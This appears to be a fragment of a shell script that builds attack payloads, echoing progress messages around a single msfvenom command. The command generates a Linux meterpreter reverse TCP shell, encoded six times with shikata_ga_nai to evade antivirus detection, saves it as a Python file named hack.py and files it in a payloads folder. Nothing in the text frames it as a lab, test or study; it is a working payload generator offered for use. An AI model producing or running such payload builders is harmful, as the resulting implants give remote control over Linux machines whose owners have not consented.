echo "[+] Creating Payload ==> Linux"
echo ""
msfvenom -p linux/x86/meterpreter_reverse_tcp --platform linux -e x86/shikata_ga_nai -i 6 -f py -o hack.py

mkdir payloads
mv hack.py payloads
echo "[+] payload was created"
